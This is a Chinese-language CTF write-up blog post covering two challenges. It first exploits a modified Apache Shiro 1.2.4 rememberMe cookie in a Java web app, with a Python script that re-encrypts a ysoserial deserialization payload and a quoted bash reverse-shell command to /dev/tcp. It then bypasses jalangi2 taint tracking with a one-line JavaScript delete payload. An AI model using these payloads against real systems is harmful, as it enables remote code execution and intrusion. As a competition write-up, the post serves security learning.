---
title: OGeek 线下 Java Web And XCTF Final babytaint Writeup
date: 2019-10-31 22:37:15
tags: [web, writeup]
---

因为最近课程非常非常多, 还顺带考试 + 实验报告, 咕咕咕掉了许多比赛, 真正去的也只有 OGeek, 其他都是云比赛.  
拿做出来的题目里面选两题写个 Writeup 吧, 不然太久没更新了 (逃

<!--more-->

## Java Web

这题运气比较好, 拿了一血  
拿到题目可以看到一堆 jsp, 可以确定是 java web.  

```
$ tree -L 2 . --dirsfirst
.
├── css
│   ├── main.css
│   └── util.css
├── fonts
│   ├── font-awesome-4.7.0
│   ├── iconic
│   └── poppins
├── images
│   ├── icons
│   └── bg-01.jpg
├── js
│   └── main.js
├── META-INF
│   └── MANIFEST.MF
├── vendor
│   ├── animate
│   ├── animsition
│   ├── bootstrap
│   ├── countdowntime
│   ├── css-hamburgers
│   ├── daterangepicker
│   ├── jquery
│   ├── perfect-scrollbar
│   └── select2
├── WEB-INF
│   ├── classes
│   ├── lib
│   └── web.xml
├── error.jsp
├── index.jsp
├── login.jsp
└── success.jsp
```

逻辑比较简单, 漏洞也不在这些 jsp 里面

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@taglib prefix="shiro" uri="http://shiro.apache.org/tags" %>

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Login V3</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!--===============================================================================================-->
    <link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
    <!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
    <!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
    <!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
    <!--===============================================================================================-->
<!-- 省略掉一些 html -->

<!--
<form action="/register" method="POST">
    <input type="text" name="username" value=""><br>
    <input type="text" name="password" value=""><br>
    <input type="submit" name="submit" value="submit"><br>
</form>
-->

</body>
</html>
```

可以看到 shiro, 注意 `WEB-INF/lib/` 里面的 `shiro-core-1.2.4.jar` 是存在漏洞的版本, 可以利用 java 反序列化执行命令.
遂直接用了之前的找的 exp, 但是 JRMPClient 并没有回连的反应, 再看看 web.xml

web.xml
```xml
  <context-param>
    <param-name>contextConfigLocation</param-name>
    <param-value>
      classpath:spring-shiro.xml
    </param-value>
  </context-param>
  <listener>
    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
  </listener>


  <filter>
    <filter-name>shiroFilter</filter-name>
    <filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
    <async-supported>true</async-supported>
    <init-param>
      <param-name>targetFilterLifecycle</param-name>
      <param-value>true</param-value>
    </init-param>
  </filter>

  <filter-mapping>
    <filter-name>shiroFilter</filter-name>
    <url-pattern>/*</url-pattern>
  </filter-mapping>
```

找到 WEB-INF/classes/spring-shiro.xml
```xml
<!-- 省略掉一些没用的配置 -->

    <!-- rememberMe管理器 -->
    <bean id="rememberMeManager" class="com.collection.shiro.manager.ShiroRememberManager">
        <property name="cookie" ref="rememberMeCookie"/>
    </bean>

<!-- 省略掉一些没用的配置 -->
```

可以看到出题人用了自己实现的 rememberMeManager, 我们掏出 jd-gui 看看.

WEB-INF/classes/com/collection/shiro/manager/ShiroRememberManager.class
```java
private byte[] getKeyFromConfig() {
    try {
        InputStream fileInputStream = getClass().getResourceAsStream("remember.key");
        String key = "";
        
        if (fileInputStream == null || fileInputStream.available() < 32) {
        BufferedWriter writer = new BufferedWriter(new FileWriter(getClass().getResource("/").getPath() + "com/collection/shiro/manager/remember.key"));
        key = RandomStringUtils.random(32, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_=");
        writer.write(key);
        writer.close();
        } else {
        byte[] bytes = new byte[fileInputStream.available()];
        fileInputStream.read(bytes);
        key = new String(bytes);
        fileInputStream.close();
        } 
        key = (new Md5Hash(key)).toString();
        return key.getBytes();
    } catch (Exception e) {
        e.printStackTrace();
        
        return null;
    } 
}
```

WEB-INF/classes/com/collection/shiro/crypto/ShiroCipherService.class
```java
public class ShiroCipherService implements CipherService {
  public ByteSource decrypt(byte[] ciphertext, byte[] key) throws CryptoException {
    String skey = (new Sha1Hash(new String(key))).toString();
    byte[] bkey = skey.getBytes();
    byte[] data_bytes = new byte[ciphertext.length];
    for (int i = 0; i < ciphertext.length; i++) {
      data_bytes[i] = (byte)(ciphertext[i] ^ bkey[i % bkey.length]);
    }
    byte[] jsonData = new byte[ciphertext.length / 2];
    for (int i = 0; i < jsonData.length; i++) {
      jsonData[i] = (byte)(data_bytes[i * 2] ^ data_bytes[i * 2 + 1]);
    }
    JSONObject jsonObject = new JSONObject(new String(jsonData));
    String serial = (String)jsonObject.get("serialize_data");
    return ByteSource.Util.bytes(Base64.getDecoder().decode(serial));
  }
  public ByteSource encrypt(byte[] plaintext, byte[] key) throws CryptoException {
    String sign = (new Md5Hash(UUID.randomUUID().toString())).toString() + "asfda-92u134-";
    Subject subject = SecurityUtils.getSubject();
    HttpServletRequest servletRequest = WebUtils.getHttpRequest(subject);
    String user_agent = servletRequest.getHeader("User-Agent");
    String ip_address = servletRequest.getHeader("X-Forwarded-For");
    ip_address = (ip_address == null) ? servletRequest.getRemoteAddr() : ip_address;
    String data = "{\"user_is_login\":\"1\",\"sign\":\"" + sign + "\",\"ip_address\":\"" + ip_address + "\",\"user_agent\":\"" + user_agent + "\",\"serialize_data\":\"" + Base64.getEncoder().encodeToString(plaintext) + "\"}";
    byte[] data_bytes = data.getBytes();
    byte[] okey = (new Sha1Hash(new String(key))).toString().getBytes();
    byte[] mkey = (new Sha1Hash(UUID.randomUUID().toString())).toString().getBytes();
    byte[] out = new byte[2 * data_bytes.length];
    for (int i = 0; i < data_bytes.length; i++) {
      out[i * 2] = mkey[i % mkey.length];
      out[i * 2 + 1] = (byte)(mkey[i % mkey.length] ^ data_bytes[i]);
    } 
    byte[] result = new byte[out.length];
    for (int i = 0; i < out.length; i++) {
      result[i] = (byte)(out[i] ^ okey[i % okey.length]);
    }
    return ByteSource.Util.bytes(result);
  }
```

这相当于魔改了原版的 shiro, 原版的是直接用的 AES. 我们可以看到这里魔改后秘钥是读的 `com/collection/shiro/manager/remember.key`. (docker 初始自带一个 key, 所有人都用的一个, 不会自己生成).  
然后算法也从 AES 变成了出题人手写的加密算法. 然后将序列化后的对象 base64 之后放在了 json 的 `serialize_data` 里面  
我们可以写个脚本二次重写一下 ysoserial 生成的 payload
```python
from hashlib import md5
from hashlib import sha1
from base64 import b64encode
from json import dumps

payload = '/home/rmb122/repos/ysoserial/target/1.bin'
payload = open(payload, 'rb').read()
payload = b64encode(payload).decode()
data = {"user_is_login": "1", "sign": "9368b2d39093ed7164841e4050f9cdbeasfda-92u134-", "ip_address": "10.10.19.245", "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
"serialize_data": payload}
data = dumps(data).encode()


key = "wR&_(NVG#c&9(CDhaDMZELDmxSe(mwbB"
k = md5(key.encode()).hexdigest()
k = sha1(k.encode()).hexdigest().encode()

newdata = bytearray()
newdata_2 = bytearray()

for i in data:
    newdata.append(i)
    newdata.append(0)

for i in range(len(newdata)):
    newdata_2.append(newdata[i] ^ k[i % len(k)])

print(b64encode(newdata_2))
```

然后直接改到 rememberMe 的 Cookie 上就行了, 尝试了几个 payload 因为 Cookie 是有长度限制的, 平常是直接将序列化数据 base64 贴上去所以不会超出限制. 这里双重 base64 加上加密还得带一个 xor key 导致很多 payload 就不能直接用了. 所以我们这里还是用 JRMPClient 来中转一下, 在自己的机器上跑一个 ysoserial.exploit.JRMPListener 就 ok 了.

这里需要注意原版的 ysoserial 是直接用的 `java.Runtime.getRuntime().exec(payload)`, 相当于 `execv(payload.split(' '))`, 会导致 `bash -c "bash -i >& /dev/tcp/10.0.19.3/7777 0>&1"` 之类的不能用, 这里当时是用了别的命令利用的漏洞. 赛后 fork 了 [ysoserial](https://github.com/rmb122/ysoserial) 改了下, 用的 `java.Runtime.getRuntime().exec(new String[]{})` 就能直接弹 shell 之类的.

## XCTF Final babytaint Writeup

拿到手先 Google `jalangi2` 是个啥, 可以搜到是个可以 hook javascript 各种操作的库. 这里是拿来搞了污点分析.
如果之前了解过一些编译原理和 PHP 的 taint 拓展, 那这道题确实挺简单的. 本质就是从 /dev/urandom/ 里面获取随机字节作为 secret, 题目 hook 了 "Source"() 的调用, 返回了 taint 过的 secret, 你需要通过某种方法 bypass 掉这个 taint. 也就是将污点去除.  
我们看一下源码, 关键就是这个

```javascript
function AnnotatedValue(val, shadow)
	{
		this.val = val;
		this.shadow = shadow;
	}
```
这个就是一个包装类, 用 shadow 来记录是否是 taint 过的值. 题目 hook 住了所有计算, 拿二元计算来看
```javascript
this.binary = function(iid, op, left, right, result)
	{
		const aleft = actual(left);
		const aright = actual(right);
		switch (op)
		{
		case "+":
			result = aleft + aright;
			break;
		case "-":
			result = aleft - aright;
			break;
		case "*":
			result = aleft * aright;
			break;
		case "/":
			result = aleft / aright;
			break;
		case "%":
			result = aleft % aright;
			break;
		case "<<":
			result = aleft << aright;
			break;
		case ">>":
			result = aleft >> aright;
			break;
		case ">>>":
			result = aleft >>> aright;
			break;
		case "<":
			result = aleft < aright;
			break;
		case ">":
			result = aleft > aright;
			break;
		case "<=":
			result = aleft <= aright;
			break;
		case ">=":
			result = aleft >= aright;
			break;
		case "==":
			result = aleft == aright;
			break;
		case "!=":
			result = aleft != aright;
			break;
		case "===":
			result = aleft === aright;
			break;
		case "!==":
			result = aleft !== aright;
			break;
		case "&":
			result = aleft & aright;
			break;
		case "|":
			result = aleft | aright;
			break;
		case "^":
			result = aleft ^ aright;
			break;
		case "delete":
			result = delete aleft[aright];
			break;
		case "instanceof":
			result = aleft instanceof aright;
			break;
		case "in":
			result = aleft in aright;
			break;
		default:
			errExit(op + " at " + iid + " not found");
		}
		return {result: new AnnotatedValue(result,
			shadow(left) || shadow(right))};
	};
```
只要两个运算符有一个是 taint 过的, 返回的也是 taint 过的值. 同时我们想要拿到 flag, 需要调用 "Sink"(secret), 但是输入的 secret  
```javascript
else if (f === "Sink")
		{
			if (shadow(args[0]))
			{
				errExit("Value passed into sink cannot be tained");
			}
			const arr = actual(args[0])
			if (!(arr instanceof Array) || arr.length !== 0x10)
			{
				errExit("must use an array with length 16 as the key");
			}
			for (let i = 0; i < arr.length; i++)
			{
				if (shadow(arr[i])) // check here
				{
					errExit("Value passed into sink cannot be tained");
				}
				if (actual(arr[i]) !== secret[i])
				{
					errExit("Wrong key!")
				}
			}
			console.log(String(fs.readFileSync("flag")));
		}
```

也不能是被 train 过的, 这就需要一点技巧来 bypass, 这里我用的是 delete 这个操作符, 因为 delete 影响的是左值对象的本身. 而这里 hook 的时候并不会将左值给 taint 掉, 只会将返回值 undefined 给 taint.
我们可以搞一个大小 256 的数组, 将 secret 作为删除的 key, 然后遍历找到是哪个 key 被 delete 掉, 我们就能获得 secret 的值而不被 taint.  
最后 payload 如下:

```javascript
key=[];a=[]; for (z=0;z<16;z++){for (i = 0;i<256;i++) {a[i]=0;};t="Source"();delete a[t[z]];for(i=0;i<256;i++){if (a[i] === undefined){key[z]=i;}}};"Sink"(key);
```
可以看到不是很复杂, 这道题好像也有很多队伍做出来 233
